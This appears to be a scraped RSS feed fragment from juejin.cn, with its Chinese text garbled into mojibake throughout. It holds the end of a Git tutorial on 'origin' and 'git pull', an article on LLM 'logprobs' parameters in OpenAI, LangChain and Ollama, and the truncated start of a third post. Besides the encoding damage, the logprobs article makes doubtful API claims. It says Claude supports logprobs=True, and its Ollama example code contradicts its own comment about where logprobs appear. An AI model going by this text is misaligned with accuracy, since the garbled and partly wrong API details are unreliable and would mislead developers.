li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨Gitä¸­ï¼Œ<strong>origin</strong> å’Œ <strong>git pull</strong> å‘½ä»¤çš„ä½¿ç”¨éå¸¸å¸¸è§ï¼Œä¸‹é¢æˆ‘ä¼šè¯¦ç»†è§£é‡Šï¼š</p>
<h2 data-id="heading-0">1. <strong>origin æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</strong></h2>
<p><strong>origin</strong> æ˜¯Gitä¸­<strong>è¿œç¨‹ä»“åº“çš„é»˜è®¤åˆ«å</strong>ï¼š</p>
<ul>
<li>å½“ä½ å…‹éš†ï¼ˆ<code>git clone</code>ï¼‰ä¸€ä¸ªä»“åº“æ—¶ï¼ŒGitä¼šè‡ªåŠ¨å°†æºä»“åº“å‘½åä¸º <code>origin</code></li>
<li>ä½ å¯ä»¥é€šè¿‡ <code>git remote -v</code> æŸ¥çœ‹æ‰€æœ‰è¿œç¨‹ä»“åº“åŠå…¶URL</li>
<li><code>origin</code> åªæ˜¯ä¸€ä¸ªåˆ«åï¼Œä½ å¯ä»¥é‡å‘½åå®ƒï¼Œä½†çº¦å®šä¿—æˆéƒ½ç”¨ <code>origin</code></li>
</ul>
<h2 data-id="heading-1">2. <strong>git pull origin main æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</strong></h2>
<p>è¿™æ˜¯ä¸€ä¸ªæ ‡å‡†çš„æ‹‰å–å‘½ä»¤ï¼š</p>
<ul>
<li><strong><code>git pull</code></strong> = <code>git fetch</code> + <code>git merge</code></li>
<li><strong><code>origin</code></strong> = è¿œç¨‹ä»“åº“çš„åˆ«å</li>
<li><strong><code>main</code></strong> = è¿œç¨‹ä»“åº“çš„åˆ†æ”¯å</li>
</ul>
<p><strong>å®Œæ•´è§£é‡Š</strong>ï¼š
ä»åä¸º <code>origin</code> çš„è¿œç¨‹ä»“åº“æ‹‰å– <code>main</code> åˆ†æ”¯çš„æœ€æ–°æäº¤ï¼Œå¹¶<strong>åˆå¹¶åˆ°å½“å‰æœ¬åœ°åˆ†æ”¯</strong></p>
<p><strong>ç¤ºä¾‹åœºæ™¯</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å‡è®¾ä½ å½“å‰åœ¨æœ¬åœ° main åˆ†æ”¯</span>
git pull origin main
<span class="hljs-comment"># ç­‰åŒäºï¼š</span>
git fetch origin main    <span class="hljs-comment"># ä»è¿œç¨‹è·å–æœ€æ–°æ•°æ®</span>
git merge origin/main    <span class="hljs-comment"># å°†è¿œç¨‹åˆ†æ”¯åˆå¹¶åˆ°å½“å‰åˆ†æ”¯</span>
</code></pre>
<h2 data-id="heading-2">3. <strong>git pull origin/main æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</strong></h2>
<p><strong>è¿™æ˜¯ä¸ªå¸¸è§é”™è¯¯ï¼</strong> âŒ</p>
<ul>
<li><strong><code>origin/main</code></strong> æ˜¯ä¸€ä¸ª<strong>è¿œç¨‹è·Ÿè¸ªåˆ†æ”¯</strong>ï¼ˆremote-tracking branchï¼‰</li>
<li>å®ƒè¡¨ç¤ºè¿œç¨‹ä»“åº“ <code>origin</code> çš„ <code>main</code> åˆ†æ”¯åœ¨<strong>æœ¬åœ°çš„ç¼“å­˜å‰¯æœ¬</strong></li>
<li><strong>ä½ ä¸èƒ½ç›´æ¥å¯¹ <code>origin/main</code> æ‰§è¡Œ <code>git pull</code></strong></li>
</ul>
<p>æ­£ç¡®çš„ç†è§£ï¼š</p>
<ul>
<li><code>origin/main</code> ç”¨äºæŸ¥çœ‹ã€æ¯”è¾ƒæˆ–åˆå¹¶ï¼Œä½†ä¸æ˜¯æ‹‰å–çš„ç›®æ ‡</li>
<li>å¦‚æœä½ æƒ³ä»è¿œç¨‹æ›´æ–°æœ¬åœ°çš„ <code>origin/main</code>ï¼Œåº”è¯¥ä½¿ç”¨ï¼š
<pre><code class="hljs language-bash" lang="bash">git fetch origin  <span class="hljs-comment"># è¿™ä¼šæ›´æ–° origin/main</span>
</code></pre>
</li>
</ul>
<h2 data-id="heading-3">4. <strong>é‡è¦åŒºåˆ«å¯¹æ¯”</strong></h2>




















<table><thead><tr><th>å‘½ä»¤</th><th>æ­£ç¡®æ€§</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><code>git pull origin main</code></td><td>âœ… æ­£ç¡®</td><td>ä»è¿œç¨‹ä»“åº“originçš„mainåˆ†æ”¯æ‹‰å–å¹¶åˆå¹¶</td></tr><tr><td><code>git pull origin/main</code></td><td>âŒ é€šå¸¸é”™è¯¯</td><td>Gitä¼šå°è¯•ä»åä¸º"origin/main"çš„è¿œç¨‹ä»“åº“æ‹‰å–ï¼ˆé€šå¸¸ä¸å­˜åœ¨ï¼‰</td></tr></tbody></table>
<h2 data-id="heading-4">5. <strong>å®é™…ä½¿ç”¨å»ºè®®</strong></h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æŸ¥çœ‹è¿œç¨‹ä»“åº“é…ç½®</span>
git remote -v

<span class="hljs-comment"># 2. æ ‡å‡†æ‹‰å–å‘½ä»¤ï¼ˆæ¨èï¼‰</span>
git pull origin main

<span class="hljs-comment"># 3. ç®€å†™å½¢å¼ï¼ˆå¦‚æœå½“å‰åˆ†æ”¯å·²è®¾ç½®ä¸Šæ¸¸è·Ÿè¸ªï¼‰</span>
git pull
<span class="hljs-comment"># éœ€è¦å…ˆè®¾ç½®ï¼šgit branch --set-upstream-to=origin/main</span>

<span class="hljs-comment"># 4. ä½¿ç”¨ fetch + merge/rebaseï¼ˆæ›´å®‰å…¨ï¼‰</span>
git fetch origin          <span class="hljs-comment"># åªè·å–ä¸åˆå¹¶</span>
git merge origin/main     <span class="hljs-comment"># æ‰‹åŠ¨åˆå¹¶</span>
<span class="hljs-comment"># æˆ–</span>
git rebase origin/main    <span class="hljs-comment"># å˜åŸºåˆå¹¶</span>
</code></pre>
<h2 data-id="heading-5">6. <strong>è®°ä½è¿™ä¸ªè§„åˆ™</strong>ï¼š</h2>
<ul>
<li><code>origin</code> â†’ è¿œç¨‹ä»“åº“çš„åå­—</li>
<li><code>main</code> â†’ åˆ†æ”¯çš„åå­—</li>
<li><code>origin/main</code> â†’ æœ¬åœ°çš„ä¸€ä¸ª<strong>æŒ‡é’ˆ</strong>ï¼ŒæŒ‡å‘è¿œç¨‹ä»“åº“ <code>origin</code> çš„ <code>main</code> åˆ†æ”¯</li>
</ul>
<p>æ‰€ä»¥æ€»æ˜¯ä½¿ç”¨ <code>git pull &lt;è¿œç¨‹ä»“åº“å&gt; &lt;åˆ†æ”¯å&gt;</code> çš„æ ¼å¼ï¼Œè€Œä¸æ˜¯ <code>git pull &lt;è¿œç¨‹è·Ÿè¸ªåˆ†æ”¯&gt;</code>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Langchainä¸­â€œlogprobsâ€çš„ä½œç”¨]]></title>    <link>https://juejin.cn/post/7595351120669098010</link>    <guid>https://juejin.cn/post/7595351120669098010</guid>    <pubDate>2026-01-15T10:27:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595351120669098010" data-draft-id="7595351120669048858" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Langchainä¸­â€œlogprobsâ€çš„ä½œç”¨"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-15T10:27:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“”å“”é¾™"/> <meta itemprop="url" content="https://juejin.cn/user/4371313960946280"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Langchainä¸­â€œlogprobsâ€çš„ä½œç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4371313960946280/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“”å“”é¾™
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:27:28.000Z" title="Thu Jan 15 2026 10:27:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰ä¸­ï¼Œ<strong><code>logprobs</code> å‚æ•°ç”¨äºæ§åˆ¶æ˜¯å¦è¿”å›æ¯ä¸ª token çš„å¯¹æ•°æ¦‚ç‡ï¼ˆlog probabilitiesï¼‰</strong> ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨éœ€è¦ <strong>åˆ†ææ¨¡å‹ç½®ä¿¡åº¦ã€å®ç°è‡ªå®šä¹‰é‡‡æ ·ç­–ç•¥ã€è°ƒè¯•ç”Ÿæˆè¿‡ç¨‹æˆ–æ„å»ºé«˜çº§åº”ç”¨ï¼ˆå¦‚ Chain-of-Thought éªŒè¯ã€ä¸ç¡®å®šæ€§ä¼°è®¡ï¼‰</strong> æ—¶éå¸¸æœ‰ç”¨ã€‚</p>
<hr/>
<h2 data-id="heading-0">âœ… æ ¸å¿ƒä½œç”¨ï¼šè¿”å› token çº§åˆ«çš„æ¦‚ç‡ä¿¡æ¯</h2>
<p>å½“ä½ è®¾ç½® <code>logprobs=True</code>ï¼ˆæˆ–æŒ‡å®šæ•°é‡ï¼‰ï¼Œæ¨¡å‹ä¸ä»…è¿”å›ç”Ÿæˆçš„æ–‡æœ¬ï¼Œè¿˜ä¼šè¿”å›ï¼š</p>
<ul>
<li>æ¯ä¸ªè¾“å‡º token çš„ <strong>å¯¹æ•°æ¦‚ç‡ï¼ˆlog probabilityï¼‰</strong></li>
<li>ï¼ˆå¯é€‰ï¼‰æ¯ä¸ªä½ç½®çš„ <strong>Top-K ä¸ªå€™é€‰ token åŠå…¶æ¦‚ç‡</strong></li>
</ul>
<blockquote>
<p>ğŸ“Œ <strong>å¯¹æ•°æ¦‚ç‡ï¼ˆlogprobï¼‰</strong> æ˜¯æ¦‚ç‡çš„è‡ªç„¶å¯¹æ•°ï¼ˆé€šå¸¸ä»¥ <code>ln</code> æˆ– <code>log_e</code> è¡¨ç¤ºï¼‰ï¼Œå› ä¸ºæ¦‚ç‡å€¼å¾ˆå°ï¼ˆå¦‚ 0.001ï¼‰ï¼Œç”¨å¯¹æ•°å¯é¿å…æµ®ç‚¹ä¸‹æº¢ï¼Œå¹¶ä¾¿äºè®¡ç®—ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">ğŸ” å…·ä½“æ•ˆæœï¼ˆä»¥ OpenAI API ä¸ºä¾‹ï¼‰</h2>
<h3 data-id="heading-2">ç¤ºä¾‹è¯·æ±‚ï¼š</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">response</span> = client.chat.completions.create(
    <span class="hljs-attr">model</span>=<span class="hljs-string">"gpt-4o"</span>,
    <span class="hljs-attr">messages</span>=[{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"Hello"</span>}],
    <span class="hljs-attr">logprobs</span>=<span class="hljs-literal">True</span>,      <span class="hljs-comment"># å¯ç”¨ logprobs</span>
    <span class="hljs-attr">top_logprobs</span>=<span class="hljs-number">2</span>      <span class="hljs-comment"># è¿”å›æ¯ä¸ªä½ç½®æ¦‚ç‡æœ€é«˜çš„ 2 ä¸ª token</span>
)
</code></pre>
<h3 data-id="heading-3">è¿”å›ç»“æ„ï¼ˆç®€åŒ–ï¼‰ï¼š</h3>
<pre><code class="hljs language-css" lang="css">{
  "choices": [{
    "message": {"<span class="hljs-attribute">content</span>": <span class="hljs-string">"Hi there!"</span>},
    "logprobs": {
      "<span class="hljs-attribute">content</span>": [
        {
          "token": <span class="hljs-string">"Hi"</span>,
          <span class="hljs-string">"logprob"</span>: -<span class="hljs-number">0.15</span>,
          <span class="hljs-string">"top_logprobs"</span>: [
            {"token": <span class="hljs-string">"Hi"</span>, <span class="hljs-string">"logprob"</span>: -<span class="hljs-number">0.15</span>},
            {"token": <span class="hljs-string">"Hey"</span>, <span class="hljs-string">"logprob"</span>: -<span class="hljs-number">0.8</span>}
          ]
        },
        {
          "token": <span class="hljs-string">" there"</span>,
          <span class="hljs-string">"logprob"</span>: -<span class="hljs-number">0.05</span>,
          <span class="hljs-string">"top_logprobs"</span>: [ ... ]
        },
        ...
      ]
    }
  }]
}
</code></pre>
<hr/>
<h2 data-id="heading-4">ğŸ¯ ä¸»è¦ç”¨é€”</h2>





























<table><thead><tr><th>åº”ç”¨åœºæ™¯</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>1. ç½®ä¿¡åº¦è¯„ä¼°</strong></td><td>å¦‚æœæŸä¸ª token çš„ <code>logprob</code> æ¥è¿‘ 0ï¼ˆå¦‚ -0.1ï¼‰ï¼Œè¯´æ˜æ¨¡å‹å¾ˆç¡®å®šï¼›å¦‚æœå¾ˆè´Ÿï¼ˆå¦‚ -5.0ï¼‰ï¼Œè¯´æ˜æ¨¡å‹çŠ¹è±«</td></tr><tr><td><strong>2. è‡ªå®šä¹‰è§£ç ç­–ç•¥</strong></td><td>å®ç° beam searchã€nucleus sampling ç­‰é«˜çº§ç”Ÿæˆç®—æ³•</td></tr><tr><td><strong>3. é”™è¯¯æ£€æµ‹ / å¹»è§‰è¯†åˆ«</strong></td><td>ä½æ¦‚ç‡ token å¯èƒ½æ˜¯å¹»è§‰æˆ–é”™è¯¯å†…å®¹</td></tr><tr><td><strong>4. å¼ºåŒ–å­¦ä¹ ï¼ˆRLHFï¼‰</strong></td><td>è®¡ç®—ç­–ç•¥æ¢¯åº¦æ—¶éœ€è¦ logprob</td></tr><tr><td><strong>5. æ¨¡å‹å¯¹æ¯”åˆ†æ</strong></td><td>æ¯”è¾ƒä¸åŒæ¨¡å‹å¯¹åŒä¸€è¾“å…¥çš„ token çº§åˆ«åå¥½</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5">âš™ï¸ ä¸åŒå¹³å°çš„ <code>logprobs</code> æ”¯æŒæƒ…å†µ</h2>



































<table><thead><tr><th>å¹³å° / æ¨¡å‹</th><th>æ˜¯å¦æ”¯æŒ <code>logprobs</code></th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><strong>OpenAI (GPT-4o, gpt-3.5)</strong></td><td>âœ… æ”¯æŒ</td><td>éœ€æ˜¾å¼è®¾ç½® <code>logprobs=True</code></td></tr><tr><td><strong>Anthropic (Claude 3+)</strong></td><td>âœ… æ”¯æŒ</td><td>é€šè¿‡ <code>logprobs=True</code> å’Œ <code>top_k</code> æ§åˆ¶</td></tr><tr><td><strong>Ollama (Llama 3, Mistral ç­‰)</strong></td><td>âš ï¸ <strong>éƒ¨åˆ†æ”¯æŒ</strong></td><td>éœ€é€šè¿‡åº•å±‚ APIï¼ˆå¦‚ <code>ollama generate</code>ï¼‰æˆ– LangChain çš„ <code>with_logprobs</code></td></tr><tr><td><strong>Hugging Face Transformers</strong></td><td>âœ… æ”¯æŒ</td><td>ä½¿ç”¨ <code>model.generate(..., output_scores=True, return_dict_in_generate=True)</code></td></tr><tr><td><strong>Google Gemini</strong></td><td>âŒ ä¸ç›´æ¥æ”¯æŒ</td><td>éœ€ç”¨å…¶ä»–æ–¹å¼ä¼°ç®—</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-6">ğŸ åœ¨ LangChain ä¸­ä½¿ç”¨ <code>logprobs</code></h2>
<p>LangChain å¯¹éƒ¨åˆ†æ¨¡å‹å°è£…äº† logprobs æ”¯æŒï¼š</p>
<pre><code class="hljs language-ini" lang="ini">from langchain_openai import ChatOpenAI

<span class="hljs-attr">llm</span> = ChatOpenAI(
    <span class="hljs-attr">model</span>=<span class="hljs-string">"gpt-4o"</span>,
    <span class="hljs-attr">logprobs</span>=<span class="hljs-literal">True</span>,       <span class="hljs-comment"># å¯ç”¨</span>
    <span class="hljs-attr">top_logprobs</span>=<span class="hljs-number">3</span>       <span class="hljs-comment"># è¿”å› top-3 å€™é€‰</span>
)

<span class="hljs-attr">response</span> = llm.invoke(<span class="hljs-string">"What is 2+2?"</span>)
<span class="hljs-comment"># response.response_metadata ä¸­åŒ…å« logprobs ä¿¡æ¯</span>
print(response.response_metadata<span class="hljs-section">["logprobs"]</span>)
</code></pre>
<blockquote>
<p>âš ï¸ æ³¨æ„ï¼šä¸æ˜¯æ‰€æœ‰ LangChain LLM å°è£…éƒ½æ”¯æŒæ­¤å‚æ•°ï¼ˆå¦‚ <code>ChatOllama</code> ç›®å‰ä¸ç›´æ¥æš´éœ² logprobsï¼‰ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-7">ğŸ“‰ <code>logprob</code> æ•°å€¼è§£è¯»</h2>



































<table><thead><tr><th>logprob å€¼</th><th>æ¦‚ç‡ï¼ˆapproxï¼‰</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><code>0.0</code></td><td>100%</td><td>ç¡®å®šæ€§æé«˜ï¼ˆå‡ ä¹ä¸å¯èƒ½ï¼‰</td></tr><tr><td><code>-0.1</code></td><td>~90%</td><td>éå¸¸è‡ªä¿¡</td></tr><tr><td><code>-1.0</code></td><td>~37%</td><td>ä¸­ç­‰ç½®ä¿¡</td></tr><tr><td><code>-3.0</code></td><td>~5%</td><td>ä½ç½®ä¿¡ï¼Œå¯èƒ½å‡ºé”™</td></tr><tr><td><code>-10.0</code></td><td>~0.0045%</td><td>å‡ ä¹éšæœºçŒœæµ‹</td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡ å…¬å¼ï¼š<code>probability = exp(logprob)</code></p>
</blockquote>
<hr/>
<h2 data-id="heading-8">âš ï¸ æ³¨æ„äº‹é¡¹</h2>
<ol>
<li><strong>æ€§èƒ½å¼€é”€</strong><br/>
å¯ç”¨ <code>logprobs</code> ä¼šç•¥å¾®å¢åŠ æ¨ç†æ—¶é—´å’Œå“åº”ä½“ç§¯ã€‚</li>
<li><strong>å¹¶éæ‰€æœ‰ token éƒ½è¿”å›</strong><br/>
æœ‰äº› API åªå¯¹ <strong>æ–°ç”Ÿæˆçš„ token</strong> è¿”å› logprobsï¼Œä¸åŒ…æ‹¬ promptã€‚</li>
<li><strong>æœ¬åœ°æ¨¡å‹æ”¯æŒæœ‰é™</strong><br/>
Ollama é»˜è®¤ä¸è¿”å› logprobsï¼Œéœ€ä¿®æ”¹åº•å±‚è°ƒç”¨ï¼ˆå¦‚ç›´æ¥ POST åˆ° <code>/api/generate</code> å¹¶è®¾ <code>"options": {"logprobs": 5}</code>ï¼‰ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-9">âœ… æ€»ç»“</h2>

























<table><thead><tr><th>é—®é¢˜</th><th>ç­”æ¡ˆ</th></tr></thead><tbody><tr><td><strong><code>logprobs</code> æ˜¯ä»€ä¹ˆï¼Ÿ</strong></td><td>æ¯ä¸ªè¾“å‡º token çš„å¯¹æ•°æ¦‚ç‡</td></tr><tr><td><strong>æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</strong></td><td>è¯„ä¼°ç½®ä¿¡åº¦ã€è‡ªå®šä¹‰ç”Ÿæˆã€æ£€æµ‹å¹»è§‰ã€RLHF ç­‰</td></tr><tr><td><strong>å¦‚ä½•å¯ç”¨ï¼Ÿ</strong></td><td>åœ¨æ¨¡å‹è°ƒç”¨æ—¶è®¾ç½® <code>logprobs=True</code>ï¼ˆæˆ–ç±»ä¼¼å‚æ•°ï¼‰</td></tr><tr><td><strong>æœ¬åœ°æ¨¡å‹ï¼ˆå¦‚ Llama3ï¼‰æ”¯æŒå—ï¼Ÿ</strong></td><td>Ollama éƒ¨åˆ†æ”¯æŒï¼Œéœ€æŸ¥å…·ä½“åç«¯ï¼›Hugging Face å®Œå…¨æ”¯æŒ</td></tr></tbody></table>
<hr/>
<p>å¦‚æœä½ æ­£åœ¨ä½¿ç”¨ <strong>Ollama + Llama3.1</strong> å¹¶æƒ³è·å– logprobsï¼Œå¯ä»¥è¿™æ ·å°è¯•ï¼ˆç›´æ¥è°ƒç”¨ Ollama APIï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

response = requests.post(
    <span class="hljs-string">"http://localhost:11434/api/generate"</span>,
    json={
        <span class="hljs-string">"model"</span>: <span class="hljs-string">"llama3.1"</span>,
        <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"Hello"</span>,
        <span class="hljs-string">"options"</span>: {<span class="hljs-string">"logprobs"</span>: <span class="hljs-number">3</span>},  <span class="hljs-comment"># è¿”å› top-3 logprobs</span>
        <span class="hljs-string">"stream"</span>: <span class="hljs-literal">False</span>
    }
)
<span class="hljs-built_in">print</span>(response.json()[<span class="hljs-string">"context"</span>])  <span class="hljs-comment"># æ³¨æ„ï¼šOllama çš„ logprobs åœ¨ "eval_count" ç­‰å­—æ®µä¸­ï¼Œç»“æ„è¾ƒå¤æ‚</span>
</code></pre>
<blockquote>
<p>ğŸ” Ollama çš„ logprobs æ”¯æŒä»åœ¨æ¼”è¿›ä¸­ï¼Œå»ºè®®æŸ¥çœ‹æœ€æ–°æ–‡æ¡£ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Agentic Search: AIé©±åŠ¨çš„ä¸‹ä¸€ä»£ä¼ä¸šæœç´¢]]></title>    <link>https://juejin.cn/post/7595414148486873128</link>    <guid>https://juejin.cn/post/7595414148486873128</guid>    <pubDate>2026-01-15T10:28:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595414148486873128" data-draft-id="7595131688940257320" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Agentic Search: AIé©±åŠ¨çš„ä¸‹ä¸€ä»£ä¼ä¸šæœç´¢"/> <meta itemprop="keywords" content="æœç´¢å¼•æ“"/> <meta itemprop="datePublished" content="2026-01-15T10:28:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" 